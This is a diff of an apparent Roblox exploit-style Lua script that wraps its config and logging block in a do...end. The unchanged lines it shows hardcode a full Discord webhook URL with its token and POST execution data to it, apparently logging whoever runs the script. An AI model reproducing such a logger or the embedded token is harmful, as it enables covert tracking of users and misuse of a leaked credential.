@@ -3,6 +3,7 @@
 ]]
 
 --// Config
+do 
 getgenv().whscript = "new modpack"        --Change to the name of your script
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1545280761265922128/8TpVpah5wzJGUx3OZa_wG0cd7micZMe036g6rNz4AdIaMOPNqwmeLY0jFVI8yFoPurUR"  --Put your Webhook Url here
 getgenv().ExecLogSecret = true              --decide to also log secret section
@@ -217,7 +218,7 @@ else
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
 end
-
+end
 
 
 if not game:IsLoaded() then game.Loaded:Wait() end
